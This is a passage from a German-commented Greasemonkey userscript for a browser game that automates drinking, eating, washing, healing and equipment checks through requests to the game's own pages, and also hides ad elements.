            if (type == "")
                if (plundername == PGu_getValue("LastPlunderName", ""))
                	return 0;

            return -1;	// nichts gefunden
        }

        // **********************************************************************************
        // Funktion legt Alkoholplunder an bzw. benutzt ihn (PG reloaded)
        // **********************************************************************************
        function alcoPlunderAnlegen(content1, promille, restore) {
            // **********************************************************************************
            // *** GM_XMLHTTPREQUEST *** Abrufen der Plunder-Seite
            // **********************************************************************************
            GM_xmlhttpRequest({method:"GET", url: PLUNDER_URL + (oldVersion ? "" : "ajax/?c=" + (nrOfTabs == 6?4:1)), onload:function(responseDetails) {
                	var content = responseDetails.responseText;
                	if (nrOfTabs != 6 && restore && restPlunder == "") {
                		// Aktuellen Plunder ermitteln und anzeigen
                        if (oldVersion)
                            GetCurrentPlunder(content);

                		restPlunderimg = PGu_getValue("LastPlunderImg", "");
                		restPlunder = PGu_getValue("LastPlunderName", "");
                	}
                	var doc = HTML2DOM(content);
                	if (oldVersion)
                		promille = GetPromille(doc);
                	if (promille >= 3.65)
                		return;             // 4 Promille ist uebel

                	var alcocnt = 0;
                	var firstAlcoInList = 9999;
                	var alcpl = -1;
                	if (doc.getElementsByTagName("table").length > 0) {
                		// Referenz auf Plundertabelle speichern
                		var plundertable = doc.getElementsByTagName("table")[0];
                		// Referenz auf Zeilen der Plundertabelle speichern
                		var plundertrs = plundertable.getElementsByTagName("tr");

                		for (var j = 0; j < alcoplunder.length; j++) {
                			var plundername = alcoplunder[j];
                			var pInd = suchePlunder(doc, plundername, "");
                			exalcoplunder[j] = pInd;
                			if (pInd >= 0) {
                				if (pInd == 0) {
                					alcoActionNr[j] = "";
                					alcoPlunderInfo[j] = PGu_getValue("LastPlunderImg", "") + "*" + plundername + "*A";
                				} else {
							pInd = pInd + oldVersion - 1;
                					alcoActionNr[j] = GetActionNumber((oldVersion?"":KEYWORD_JUNK[lang])+content, GetPlunderPic(plundertrs[pInd]), plundername);
                					if (nrOfTabs != 6)
                						alcoPlunderInfo[j] = GetPlunderPic(plundertrs[pInd]) + "*" + plundername + "*A";
                					else
                						alcoPlunderInfo[j] = GetPlunderPic(plundertrs[pInd]) + "*" + plundername + "*B";
                				}
                				var alcoInList = IsPlunderInList(alcoPlunderInfo[j]);
                				if (alcoInList > 0 && alcoInList < firstAlcoInList) {
                					firstAlcoInList = alcoInList;
                					alcpl = j;
                				}
                				alcocnt++;
                			}
                		}

                		if (restIndex < 0)
                			restIndex = suchePlunder(doc, restPlunder, "");

                		if (restIndex > 0) {
                			restPlunderimg = GetPlunderPic(plundertrs[restIndex + oldVersion - 1]);
                			restActionNr = GetActionNumber((oldVersion?"":KEYWORD_JUNK[lang])+content, restPlunderimg, restPlunder);
                		}
                	}

                	var plInd = -1;
                	if (alcocnt > 0) {	// es ist AlkoPlunder da
                		if (alcpl < 0)
                			for (alcpl = 0; alcpl < alcoplunder.length; alcpl++)
                				if (exalcoplunder[alcpl] >= 0)
                					break;
                		plInd = exalcoplunder[alcpl];
                	}
                	var anlegplunder = "";
                	var anlegActionNr = "";
                	if (nrOfTabs == 6 && alcpl >= 0) {
                		var ActionNr = alcoActionNr[alcpl];
                		var tdpm = content.indexOf('id="pm_'+ActionNr+'"');
                		var href = content.substr(tdpm).split('<a href="')[3].split('"')[0];
				if (href.substr(0,4) == "java") {
				    href = content.substr(tdpm).split('<form')[1].split('action="')[1].split('"')[0];
				    ActionNr = content.substr(tdpm).split('<input')[1].split('value="')[1].split('"')[0];
				}
                		var PLUNDERUSE_URL = TOWNBASE_URL + href.substr(1);
                		// **********************************************************************************
                		// *** GM_XMLHTTPREQUEST *** Abrufen der Plunderbenutzung (--> Plunder wird benutzt)
                		// **********************************************************************************
				GM_xmlhttpRequest({method: 'POST', url: PLUNDERUSE_URL, headers: {'Content-type': 'application/x-www-form-urlencoded'},
						data: encodeURI("plunder="+ActionNr),
						onload: function(responseDetails) {
                			// Seite refreshen
                			refreshPage();
                		}});
                		return;
                	}
                	if (promille >= wpromille) {
                		DrinkBeer(content1, 1); // nur 1 Bier trinken
                	}
                	else if (plInd == 0) {	// AlkoPlunder ist angelegt
                		var pInd = suchePlunder(doc, alcoplunder[alcpl], "A"); // suche anderen Plunder zum Anlegen
                		if (pInd > 0) {			// gefunden
                            pInd = pInd + oldVersion - 1;
                			anlegplunder = GetPlunderName(plundertrs[pInd]);
                			anlegActionNr = GetActionNumber(content, GetPlunderPic(plundertrs[pInd]), anlegplunder);
                			PGu_setValue("LastPlunderImg", getPicAddr(GetPlunderPic(plundertrs[pInd])));
                			PGu_setValue("LastPlunderName", anlegplunder);
                			// **********************************************************************************
                			// *** GM_XMLHTTPREQUEST *** POSTEN des Plunderwechsels
                			// **********************************************************************************
                			GM_xmlhttpRequest({method: 'POST', url: PLUNDERCHANGE_URL, headers: {'Content-type': 'application/x-www-form-urlencoded'},
                				data: encodeURI('f_plunder=' + anlegActionNr),
                				onload: function(responseDetails) {
                					// jetzt aber Alkoholplunder anlegen
                					alcoPlunderAnlegen(content, promille, restore);
                				}
                			});
                		}
                	} else if (plInd > 0) {
                		var plunderinfo = alcoPlunderInfo[alcpl];
                		PGu_setValue("LastPlunderImg", getPicAddr(GetPicFromPlunderInfo(plunderinfo)));
                		PGu_setValue("LastPlunderName", GetNameFromPlunderInfo(plunderinfo));

                		// Angelegten Plunder anzeigen
                		ShowCurrentPlunder(getPicAddr(GetPicFromPlunderInfo(plunderinfo)), GetNameFromPlunderInfo(plunderinfo), oldVersion);

                		var ActionNr = alcoActionNr[alcpl];
                		// **********************************************************************************
                		// *** GM_XMLHTTPREQUEST *** POSTEN des Plunderwechsels
                		// **********************************************************************************
                		GM_xmlhttpRequest({method: 'POST', url: PLUNDERCHANGE_URL, headers: {'Content-type': 'application/x-www-form-urlencoded'},
                			data: encodeURI('f_plunder=' + ActionNr),
                			onload: function(responseDetails) {
                				if (restPlunder != "none" && restPlunder != "" && restPlunder != GetNameFromPlunderInfo(plunderinfo))
                				{
                					if (restActionNr == "" && oldVersion) {
                						var doc = HTML2DOM(responseDetails.responseText);

                						// Referenz auf Plundertabelle speichern
                						var plundertable = doc.getElementsByTagName("table")[0];
                						// Referenz auf Zeilen der Plundertabelle speichern
                						var plundertrs = plundertable.getElementsByTagName("tr");
                						restIndex = suchePlunder(doc, restPlunder, "");
                						if (restIndex > 0) {
                							restActionNr = GetActionNumber(responseDetails.responseText, restPlunderimg, restPlunder);
                							restPlunderimg = GetPlunderPic(plundertrs[restIndex + oldVersion - 1]);
                						}
                					}

                					if (restActionNr == "")     // Plunder kann nicht wiederangelegt werden !!
                                        refreshPage();
                                    else {
                                        PGu_setValue("LastPlunderImg", getPicAddr(restPlunderimg));
                                        PGu_setValue("LastPlunderName", restPlunder);

                                        // Angelegten Plunder anzeigen
                                        ShowCurrentPlunder(getPicAddr(restPlunderimg), restPlunder, oldVersion);
                                        // **********************************************************************************
                                        // *** GM_XMLHTTPREQUEST *** POSTEN des Plunderwechsels f�r den urspr�nglichen Plunder
                                        // **********************************************************************************
                                        GM_xmlhttpRequest({method: 'POST', url: PLUNDERCHANGE_URL, headers: {'Content-type': 'application/x-www-form-urlencoded'},
                                            data: encodeURI('f_plunder=' + restActionNr),
                                            onload: function(responseDetails) {
                                                // Seite refreshen
                                                refreshPage();
                                                }
                                            });
                                    }
                				} else {
                					// Seite refreshen
                					refreshPage();
                				}
                			}
                		});
                	}
                	else {          // kein Alco-Plunder da, aber weniger als 2,5 Promille bzw. 2 Promille bei TA
                		// Zahl der benötigten Bierflaschen berechnen
                		var bottlesneeded = Math.ceil(Math.round((wpromille - promille)*100)/35);

                		DrinkBeer(content1, bottlesneeded);
                	}
                }
            });
        return;
        }

        if (event.shiftKey != 0) {
            EatDrinkFeedBack = 1 - EatDrinkFeedBack;
            PG_setValue("EatDrinkFB", EatDrinkFeedBack);
        }

        // Wartecursor anzeigen
        CursorWait(currentelem, true);

        // **********************************************************************************
        // *** GM_XMLHTTPREQUEST *** Abrufen der Trinken-Seite
        // **********************************************************************************
        GM_xmlhttpRequest({method: 'GET', url: DRINK_STACK, onload: function(responseDetails) {
            var nrofbeer = 0;

            var content = responseDetails.responseText;

            // Aktuelle Promille ermitteln
            var promille = GetPromille(HTML2DOM(content));

            // ***********************************************************************************************
            // Es liegen mehr als 3,65 Promille an --> Lebensgefahr !!
            // ***********************************************************************************************
            if (promille >= 3.65) {
                // Keinen Wartecursor anzeigen
                CursorWait(currentelem, false);
                // Benutzer benachrichtigen
                alert(getLangTxt(TxtDrinkLifeRisk));
            }
            // ***********************************************************************************************
            // Es liegen mehr als 2,5 Promille an
            // ***********************************************************************************************
            else if (promille >= 2.5) {
                // Keinen Wartecursor anzeigen
                //CursorWait(currentelem, false);
                // Benutzer benachrichtigen
                //alert(getLangTxt(TxtNoNeedToDrink));
                DrinkBeer(content, 1);          // nur 1 Bier trinken !!
            // ***********************************************************************************************
            // Sonst: Wenn weniger als 2,5 Promille anliegen: Promille rauf durch Plunder oder Trinken
            // ***********************************************************************************************
            } else {
                restPlunder = "";
                restActionNr = "";
                alcoPlunderAnlegen(content, promille, true);
            }
        }
        });
    },false);
}

// **********************************************************************************
// **********************************************************************************
// Funktion fügt den Handler zum Auto-Essen ein
// **********************************************************************************
// **********************************************************************************
function PromilleDownHandler(currentelem) {
    currentelem.style.cursor = 'pointer';

    // **********************************************************************************
    // EVENTHANDLER
    // **********************************************************************************
    currentelem.addEventListener('click', function(event) {

        // **********************************************************************************
        // Funktion prüft, ob die Promillezahl wirklich auf unter 0,75 gesunken ist
        // **********************************************************************************
        function CheckPromilleDownSuccess(content) {
            // Seite refreshen
            refreshPage();
            var promille = GetPromille(HTML2DOM(content));
            // Wenn der Alkoholpegel auf ein unkritisches Niveau gesunken ist
            if (promille <= (crimePlanned?0:0.75)) {
                // User benachrichtigen
                if (EatDrinkFeedBack)
                	alert(getLangTxt(TxtYummy));
            // sonst: Der Alkoholpegel ist NICHT auf ein unkritisches Niveau gesunken
            } else {
                // User benachrichtigen
                alert(printf(getLangTxt(TxtEatError), promille));
            }
        }

        // **********************************************************************************
        // Funktion sendet die POSTS zum Essen
        // **********************************************************************************
        function EatIt(nroffood) {
            var id = 0;
            var menge = 0;
            for (var i = 0; i < nroffood.length; i++) {
                if (nroffood[i] > 0) {
                	var id = idoffood[i];
                	var menge = nroffood[i];
                	nroffood[i] = 0;
                	break;
                }
            }
            // **********************************************************************************
            // *** GM_XMLHTTPREQUEST *** POSTEN des Essensbefehls
            // **********************************************************************************
            GM_xmlhttpRequest({method: 'POST', url: EAT_URL, headers: {'Content-type': 'application/x-www-form-urlencoded'},
                data: encodeURI('item=&promille=&id=' + id + '&menge=' + menge),
                onload: function(responseDetails)	{
                	var moretoEat = false;
                	for (var i = 0; i < nroffood.length; i++)
                		if (nroffood[i] > 0) {
                			moretoEat = true;
                			break;
                		}
                	if (moretoEat)
                		EatIt(nroffood);
                	else // Erfolg prüfen
                		CheckPromilleDownSuccess(responseDetails.responseText);
                }
            });
        }

        if (event.shiftKey != 0) {
            EatDrinkFeedBack = 1 - EatDrinkFeedBack;
            PG_setValue("EatDrinkFB", EatDrinkFeedBack);
        }

        // Wartecursor anzeigen
        CursorWait(currentelem, true);

        // **********************************************************************************
        // *** GM_XMLHTTPREQUEST *** Abrufen der Essen-Seite
        // **********************************************************************************
        GM_xmlhttpRequest({method: 'GET', url: EAT_STACK, onload: function(responseDetails) {
            var nroffood = new Array();
            var stacknroffood = new Array();

            var content = responseDetails.responseText;

            // Aktuelle Promille ermitteln
            promille = GetPromille(HTML2DOM(content));
            var sumprom = 0;

            for (i = 0; i < FoodNames.length; i++) {
                stacknroffood[i] = GetNrOfFood(content, FoodNames[i]);
                if (isNaN(stacknroffood[i]))
                	stacknroffood[i] = 0;
                nroffood[i] = 0;
                sumprom += stacknroffood[i] * promillevals[i];
            }

            // ***********************************************************************************************
            // Wenn genügend Essen vorhanden ist
            // ***********************************************************************************************
            if (sumprom > promille) {
                // ***********************************************************************************************
                // Wenn mehr als 0,75 Promille anliegen
                // ***********************************************************************************************
                var promZiel = (crimePlanned?0:0.75);
                if (promille <= promZiel && TAisEatSnack)
                	promille = promZiel + 0.35;     // es muesste nichts getrunken werden, aber TA ist "Essen"
                if (promille > promZiel) {
                	promille -= promZiel;
                	while (promille > 0) {
                		var maxexfood = -1;
                		var bestfood = -1;
                		for (i = 0; i < FoodNames.length; i++)
                			if (stacknroffood[i] >= 1) {
                				maxexfood = i;
                				if (promille <= promillevals[i] && bestfood < 0)
                					bestfood = i;
                			}
                		if (bestfood < 0)
                			bestfood = maxexfood;
                		if (bestfood < 0)
                			break;

                		nroffood[bestfood]++;
                		stacknroffood[bestfood]--;
                		promille -= promillevals[bestfood];
                	}

                	// Essen gehen, wenn es gereicht hat
                	if (promille <= 0) {
                		EatIt(nroffood);

                		// Keinen Wartecursor anzeigen
                		CursorWait(currentelem, false);
                	} else {
                		// Keinen Wartecursor anzeigen
                		CursorWait(currentelem, false);
                		// Benutzer benachrichtigen
                		alert(getLangTxt(TxtNotEnoughToEat));
                	}
                // ***********************************************************************************************
                // sonst: Es liegen 0,75 Promille oder weniger an
                // ***********************************************************************************************
                } else {
                	// Keinen Wartecursor anzeigen
                	CursorWait(currentelem, false);
                	// Benutzer benachrichtigen
                	alert(getLangTxt(TxtNoNeedToEat));
                }
            // ***********************************************************************************************
            // sonst: Es ist nicht genügend Essen vorhanden
            // ***********************************************************************************************
            } else {
                // Keinen Wartecursor anzeigen
                CursorWait(currentelem, false);
                // Benutzer benachrichtigen
                alert(printf(getLangTxt(TxtNotMuchToEat), convertUni(FoodNames[1]), convertUni(FoodNames[4])));
            }
        } });
    },false);
}

// **********************************************************************************
// **********************************************************************************
// Funktion liefert den aktuellen Geldstand zurück
// **********************************************************************************
// **********************************************************************************
function GetMoney(doc) {
    var money = doc.getElementsByClassName("icon money")[0].getElementsByTagName("a")[0];
    money = trimString(money.innerHTML);
    while (!money.substr(0,1).match(/\d/))
        money = money.slice(1);
    while (!money.substr(money.length-1,1).match(/\d/))
        money = money.substr(0,money.length-1);
    if (currency1 != "") {
        money = money.replace(currency1, '.');
        if (money.substr(money.length-2,1) == ".")
            money = money.substr(0,money.length-1) + "0" + money.substr(money.length-1);
        money = Number(money);
    }
    else if (money.substr(money.length-3, 1) == '.') {
        DZ[lang] = '.';
        TZ[lang] = ',';
        money = Number(money.replace(/,/g, ''));
    }
    else {
        var numbers = money.match(/\d+/g);
        money = 0;
        for (i = 0; i < numbers.length-1; i++)
            money = money * 1000 + parseInt(numbers[i]);
        money += parseInt(numbers[i]) / 100;
    }

    return money;
}

// ***********************************************************************************************
// Funktion ermittelt die aktuelle Sauberkeit
// ***********************************************************************************************
function getCleanliness(content) {
    var clpos = content.indexOf('class="processbar_');
    if (clpos < 0)
        return;

    return content.substr(clpos).split("<b>")[1].split("</b>")[0];
}

// **********************************************************************************
// **********************************************************************************
// rekursive Funktion zum Heilen
// **********************************************************************************
// **********************************************************************************
function CureMe(currentelem, cnt) {

    // **********************************************************************************
    // *** GM_XMLHTTPREQUEST *** POSTEN des Kommandos zum Heilen
    // **********************************************************************************
    GM_xmlhttpRequest({method: 'POST', url: CURE_URL, headers: {'Content-type': 'application/x-www-form-urlencoded'},
        data: encodeURI('id=2'),
        onload: function(responseDetails)	{
            if (cnt > 1)
                CureMe(currentelem, cnt-1);
            else {
                // Keinen Wartecursor anzeigen
                CursorWait(currentelem, false);

                // Seite refreshen
                refreshPage();

                // User benachrichtigen
                if (EatDrinkFeedBack)
                   alert(getLangTxt(TxtLifepts1));
            }
        }
     });
}

// **********************************************************************************
// **********************************************************************************
// rekursive Funktion zum Waschen
// **********************************************************************************
// **********************************************************************************
function WashMe(currentelem, id, cnt) {

    // **********************************************************************************
    // *** GM_XMLHTTPREQUEST *** POSTEN des Kommandos zum Waschen
    // **********************************************************************************
    GM_xmlhttpRequest({method: 'POST', url: WASH_URL, headers: {'Content-type': 'application/x-www-form-urlencoded'},
        data: encodeURI('id=' + id),
        onload: function(responseDetails)	{
            if (cnt > 1)
                WashMe(currentelem, id, cnt-1);
            else {
                // Keinen Wartecursor anzeigen
                CursorWait(currentelem, false);

                // Seite refreshen
                refreshPage();

                // User benachrichtigen
                if (EatDrinkFeedBack)
                	alert(getLangTxt(TxtCleansed1));
            }
        }
     });
}

// **********************************************************************************
// **********************************************************************************
// Funktion fügt den Handler zum Waschen ein
// **********************************************************************************
// **********************************************************************************
function WashHandler(currentelem) {
    currentelem.style.cursor = 'pointer';

    // ***********************************************************************************************
    // EVENTLISTENER ANHÄNGEN
    // ***********************************************************************************************
    currentelem.addEventListener('click', function(event) {
        if (event.shiftKey != 0) {
            EatDrinkFeedBack = 1 - EatDrinkFeedBack;
            PG_setValue("EatDrinkFB", EatDrinkFeedBack);
        }

        // Wartecursor anzeigen
        CursorWait(currentelem, true);

        if (noWash) {
            // **********************************************************************************
            // *** GM_XMLHTTPREQUEST *** Abrufen der Overview-Seite, Lebenspunkte ermitteln
            // **********************************************************************************
            GM_xmlhttpRequest({method:"GET", url: OVERVIEW_URL, onload:function(responseDetails) {
                var content = responseDetails.responseText;

                // Lebenspunkte ermitteln
                var lifepts = getCleanliness(content);
                if (lifepts == 100) {
                    // ***********************************************************************************************
                    // Die Lebenspunkte liegen bereits bei 100
                    // ***********************************************************************************************
                    // Keinen Wartecursor anzeigen
                    CursorWait(currentelem, false);
                    // User benachrichtigen
                    alert(getLangTxt(TxtLifepts2));
                } else {
                    // ***********************************************************************************************
                    // Wenn die Lebenspunkte noch nicht bei 100% liegen
                    // ***********************************************************************************************
                    var cnt = Math.floor((99-lifepts) / 20);
                    if (cnt == 0)
		        cnt = 1;	// Wert liegt zwischen 80 und 99: trotzdem heilen
                    var cost = cnt * 30;

                    // Aktuellen Geldstand ermitteln
                    var doc = HTML2DOM(content);
                    var currentmoney = GetMoney(doc);

                    // ***********************************************************************************************
                    // Wenn genug Geld vorhanden ist
                    // ***********************************************************************************************
                    if (currentmoney >= cost) {
                        CureMe(currentelem, cnt);
                    // ***********************************************************************************************
                    // sonst: Es ist nicht genug Geld vorhanden
                    // ***********************************************************************************************
                    } else {
                        // User benachrichtigen
                        alert(printf(getLangTxt(TxtLifeNeeded), cost, currentmoney));
                    }
                }
            }
            });
        }
        else {
            // **********************************************************************************
            // *** GM_XMLHTTPREQUEST *** Abrufen der Activities-Seite, Sauberkeit ermitteln
            // **********************************************************************************
            GM_xmlhttpRequest({method:"GET", url: TOWNBASE_URL+'activities/', onload:function(responseDetails) {
                var content = responseDetails.responseText;

                // Cleanliness ermitteln
                clpos = content.indexOf('<a class="tool');
                if (clpos < 0)
                    return;
                var cltext = content.substr(clpos).split("|")[1].split(":")[1];
                clean = parseInt(cltext);

                if (clean == 100) {
                    // ***********************************************************************************************
                    // Die Sauberkeit lieg bereits bei 100%
                    // ***********************************************************************************************
                    // Keinen Wartecursor anzeigen
                    CursorWait(currentelem, false);
                    // User benachrichtigen
                    alert(getLangTxt(TxtCleansed2));
                } else {
                    // ***********************************************************************************************
                    // Wenn die Sauberkeit noch nicht bei 100% liegt
                    // ***********************************************************************************************
                    var id = 2;
                    var cnt = 1;
                    var cost = 25;
                    if (clean >= 20) {
                        var id = 1;
                        var cnt = Math.ceil((100 - clean) / 20);
                        var cost = cnt * 6;
                    }

                    // Aktuellen Geldstand ermitteln
                    var doc = HTML2DOM(content);
                    var currentmoney = GetMoney(doc);

                    // ***********************************************************************************************
                    // Wenn genug Geld vorhanden ist
                    // ***********************************************************************************************
                    if (currentmoney >= cost) {
                        WashMe(currentelem, id, cnt);
                    // ***********************************************************************************************
                    // sonst: Es ist nicht genug Geld vorhanden
                    // ***********************************************************************************************
                    } else {
                        // User benachrichtigen
                        alert(printf(getLangTxt(TxtMoneyNeeded), cost, currentmoney));
                    }
                }
            }
            });
        }
    },false);
}

// **********************************************************************************
// **********************************************************************************
// Funktion fügt den Handler für Feedback ein
// **********************************************************************************
// **********************************************************************************
function FeedbackHandler(bgrnd) {

    if (bgrnd == 'PW' && EatDrinkFeedBack == 0 || bgrnd == 'SC' && CollEndAlert == 0)
        var curElem = ShowImg(bgrnd + 'BACK', '', ICON_NOINFO, getLangTxt(TxtNoInfo), 10, 10, (bgrnd == 'PW'?102:112), 13, 5, bgrnd + 'Info');
    else
        var curElem = ShowImg(bgrnd + 'BACK', '', ICON_INFO, getLangTxt(TxtInfo), 10, 10, (bgrnd == 'PW'?102:112), 13, 5, bgrnd + 'Info');

    if (curElem == null)
        return;
    curElem.style.cursor = 'pointer';

    // ***********************************************************************************************
    // EVENTLISTENER ANHÄNGEN
    // ***********************************************************************************************

    curElem.addEventListener('click', function(event) {
        if (bgrnd == 'PW') {
            var val = EatDrinkFeedBack = 1 - EatDrinkFeedBack;
            PG_setValue("EatDrinkFB", EatDrinkFeedBack);
        }
        else {
            var val = CollEndAlert = 1 - CollEndAlert;
            PG_setValue("CollEndAlert", CollEndAlert);
        }
        if (val == 0) {
            this.src = getIconAddr(ICON_NOINFO);
            this.title = getLangTxt(TxtNoInfo);
        } else {
            this.src = getIconAddr(ICON_INFO);
            this.title = getLangTxt(TxtInfo);
        }
    }, false);
}

// **********************************************************************************
// **********************************************************************************
// Funktion prüft, ob bessere Ausrüstung möglich
// **********************************************************************************
// **********************************************************************************
function CheckBetterEquip() {
    function checkOneEquip(code) {
        var urls = new Array(WEAPONSTORE_URL, WEAPON_URL, HOME_URL);
        var classes = new Array("att", "att", "def");
        // **********************************************************************************
        // *** GM_XMLHTTPREQUEST *** Abfragen, ob es eine bessere Waffe gibt
        // **********************************************************************************
        GM_xmlhttpRequest({method:"GET", url: urls[code], onload:function(responseDetails) {
                var content = responseDetails.responseText;

                // Aus HTML ein DOM-Objekt erzeugen
                var doc = HTML2DOM(content);

                var tables = doc.getElementsByTagName("table");
                var betterval = 0;
                var betterequip = "";
                var owned = false;
                var weapon = PGu_getValue("weapon", "0") + "#";
                weapon = weapon.split("#");
                if (code == 1 && weapon[0] > 0)
                    var maxvalw = 999;
                else
                    var maxvalw = 0;
                var maxval = maxvalw;
                for (var i = 0; i < tables.length; i++) {
                    var table = tables[i];

                    // Referenz auf Tabellenzeilen in trs speichern
                    var trs = table.getElementsByTagName("tr");
                    if (code == 1 && trs[1].innerHTML.indexOf('<span class="att">') == -1)
                        continue;
                    var equip = trs[0].innerHTML.split('<span class="tiername">')[1].split('</span')[0];
                    var attdef = Number(trs[1].innerHTML.split('<span class="'+classes[code]+'">')[1].split('</span')[0]);
                    var gekauftw = (trs[2].innerHTML.indexOf(TxtBought[lang]) != -1);
                    var benutzt = (trs[3].innerHTML.indexOf(TxtSelected[lang]) != -1);
                    var bewohnt = (trs[3].innerHTML.indexOf(TxtOccupied[lang]) != -1);
                    var gekauft = (trs[3].innerHTML.indexOf(TxtMoveIn[lang]) != -1);
                    if (code == 1 && benutzt && weapon[0] == 0) {
                        weapondef = trs[3].getElementsByTagName("td")[0].innerHTML.split('value="')[1].split('"')[0];
                        weapondef += '#' + equip + '#' + trs[0].innerHTML.split('src="')[1].split('"')[0] + '#' + trs[1].innerHTML.split('<span class="'+classes[code]+'">')[1].split('</span')[0];
                        weaponatt = attdef;
                    }
                    if (gekauftw && attdef > maxval || benutzt || bewohnt)
                        maxval = maxvalw > 0?maxvalw:attdef;
                    else if (attdef > maxval) {
                        betterequip = equip;
                        betterval = attdef;
                        owned = gekauft;
                    }
                }
                if (weaponatt < 0)
                    weaponatt = 0;
                if (betterval > maxval)
                    if (code == 0)
                        weaponcheck1 = printf(getLangTxt(TxtWCheck1), betterequip, betterval - maxval);
                    else if (code == 1)
                        weaponcheck2 = printf(getLangTxt(TxtWCheck2), betterequip, betterval - maxval);
                    else if (code == 2)
                        homecheck = printf(getLangTxt(TxtHomeCheck),
                                           owned?getLangTxt(TxtHomeMovein1):getLangTxt(TxtHomeBuy1),
                                           betterequip,
                                           owned?getLangTxt(TxtHomeMovein2):getLangTxt(TxtHomeBuy2),
                                           betterval - maxval);
            }
        });
    }

    checkOneEquip(0);
    checkOneEquip(1);
    checkOneEquip(2);
}

// **********************************************************************************
// **********************************************************************************
// Funktion prüft, ob DEF-Waffe vorhanden
// **********************************************************************************
// **********************************************************************************
function AutoDefWeapon() {
    // **********************************************************************************
    // *** GM_XMLHTTPREQUEST *** Abfragen, ob eine DEF-Waffe gekauft wurde
    // **********************************************************************************
    GM_xmlhttpRequest({method:"GET", url: WEAPONSTOREDEF_URL, onload:function(responseDetails) {
            function mod (a, b) { return a - Math.floor(a/b)*b; }
            var content = responseDetails.responseText;

            // Aus HTML ein DOM-Objekt erzeugen
            var doc = HTML2DOM(content);

            var DEFweapon = PGu_getValue('LastDefWpn', '');
            var DEFweaponCost = 0;
            var tables = doc.getElementsByTagName("table");
            var gekauft = false;
            for (var i = 0; i < tables.length; i++) {
                var table = tables[i];

                // Referenz auf Tabellenzeilen in trs speichern
                var trs = table.getElementsByTagName("tr");
                if (trs.length < 4)
                    continue;
                gekauft = (trs[3].innerHTML.indexOf(TxtDefBought[lang]) != -1);
                if (gekauft) {
                    var img = trs[0].getElementsByTagName("img")[0].getAttribute("src");
                    var dauer = trs[1].innerHTML.split('<span class="')[1].split('</span')[1].split('|')[1].split('</td>')[0];
                    if (dauer.indexOf('counter') != -1) {
                        var sekunden = Number(dauer.split('counter(')[1].split(')')[0]);
                        var minuten = mod(Math.floor(sekunden/60), 60) + 100 + ":";
                        var stunden = Math.floor(sekunden/3600) + ":";
                        sekunden = mod(sekunden, 60) + 100 + "";
                        var zeit = stunden + minuten.slice(1) + sekunden.slice(1);
                        dauer = dauer.split('<b>')[0] + zeit + dauer.split('</b>')[1];
                    }
                    // Link zusammenbauen
                    var DEFweapon = trs[0].innerHTML.split('<span class="tiername">')[1].split('</span')[0];
                    var titletext = DEFweapon + ":" + dauer;
                    // V-Waffe Grafik zusammenbauen
                    ShowImg('ADBACK', WEAPONSTOREDEF_URL, img, titletext, 37, 37, 85, 14, 1, 'defweapon');
                    PGu_setValue('remindDefWpnCnt', 0);
                    PGu_setValue('LastDefWpn', DEFweapon);
                    break;
                }
                else if (DEFweapon == trs[0].innerHTML.split('<span class="tiername">')[1].split('</span')[0]) {
                    var numbers = trs[3].getElementsByTagName('input')[1].value.match(/\d+/g);
                    for (ii = 0; ii < numbers.length-1; ii++)
                        DEFweaponCost = DEFweaponCost * 1000 + parseInt(numbers[ii]);
                    if (numbers.length == 0)
                        alert('Geld nicht erkannt !!');
                    else
                        DEFweaponCost += parseInt(numbers[ii]) / 100;
                }
            }
            if (!gekauft) {
                ShowImg('ADBACK', WEAPONSTOREDEF_URL, ICON_NODEFWEAPON, '', '', '', 84, 13, 1, 'defweapon');
                var DefWpnCnt = PGu_getValue('remindDefWpnCnt', 0);
                var alerttext = getLangTxt(TxtNoDefWeapon);
                if (PGu_getValue('rebuyLastDefWpn', false) && PGu_getValue('LastDefWpn', "") != "" && DefWpnCnt == 0) {
                    if (GetMoney(doc) < DEFweaponCost)
                        alerttext = printf(getLangTxt(TxtDefWpnNoMny), DEFweaponCost, GetMoney(doc));
                    else {
                        var confBuy = PGu_getValue("woConfDefWpn", false);
                        if (!confBuy)
                            confBuy = confirm(printf(getLangTxt(TxtBuyDefWpn), DEFweapon, DEFweaponCost));
                        if (confBuy) {
                            for (var i = 0; i < tables.length; i++) {
                                // Referenz auf Tabellenzeilen in trs speichern
                                var trs = tables[i].getElementsByTagName("tr");
                                if (trs.length < 4)
                                    continue;
                                if (DEFweapon != trs[0].innerHTML.split('<span class="tiername">')[1].split('</span')[0])
                                    continue;
                                var WpnID = trs[3].getElementsByTagName('input')[0].value;
                                var name = trs[3].getElementsByTagName('input')[0].name;
                                GM_xmlhttpRequest({method:"POST", url: WEAPONSTOREDEF_URL+"buy/",
                                                   headers: {'Content-type': 'application/x-www-form-urlencoded'},
                                                   data: encodeURI('id=' + WpnID),
                                                   onload: function(responseDetails)	{
                                                               refreshPage();
                                                           }
                                                  });
                            }
                        }
                        alerttext = "";
                    }
                }
                else if (!PGu_getValue('remindDefWpn', false) && !PGu_getValue('rebuyLastDefWpn', false))
                    DefWpnCnt = PGu_getValue('remindDefWpnMax', 3);
                if (DefWpnCnt < PGu_getValue('remindDefWpnMax', 3)) {
                    if (alerttext != "")
                        alert(alerttext);
                    PGu_setValue('remindDefWpnCnt', DefWpnCnt+1);
                }
            }
        }
    });
}

function ByeByeGoogle() {
    for (var i = 1; i <= 2; i++) {
        // Div mit Google-Ads entfernen
        var googleads = document.getElementById("google_js_" + i);
        if (googleads != null) {
            googleads.parentNode.removeChild(googleads);
        }
    }
    if (location.toString().indexOf("friendlist") == -1)
        return;
    var cont = document.getElementById("content");
    if (cont == null)
        return;
    var zrel = cont.getElementsByClassName("zrelative");
    if (zrel.length > 0)
        zrel[0].style.display = "none";
}

var packData = function () {
    function blength(s) {
        var len = 0;
        for (var i = 0; i < s.length; i++) {
            var c = s.charCodeAt(i);
            if (c < 128) {
                len++;
            } else if (c > 127 && c < 2048) {
                len += 2;
            } else
                len += 3;
        }
        return len;
    }
    serialize = function(elem) {
        if (elem == null || elem == undefined || elem.constructor == Function) return 'N;';
        switch (elem.constructor) {
            case String:  return 's:' + blength(elem) + ':"' + elem + '";';
            case Number:  return (elem % 1 ? 'd:' : 'i:') + elem + ';';
            case Boolean: return 'b:' + (elem ? '1' : '0') + ';';
            case Date:    return serialize(elem.getTime());
            case RegExp:  return serialize(elem.toSource());
            case Error:   return serialize(elem.message);
            case Array:
            case Object:
              var content = '', i = 0;
              for (var j in elem) { content += serialize(Number(j)) + serialize(elem[j]); i++; }
              return 'a:' + i + ':{' + content + '}';
            default:
              return serialize(elem.toString());
        }
    }
    function base64_encode (data) {
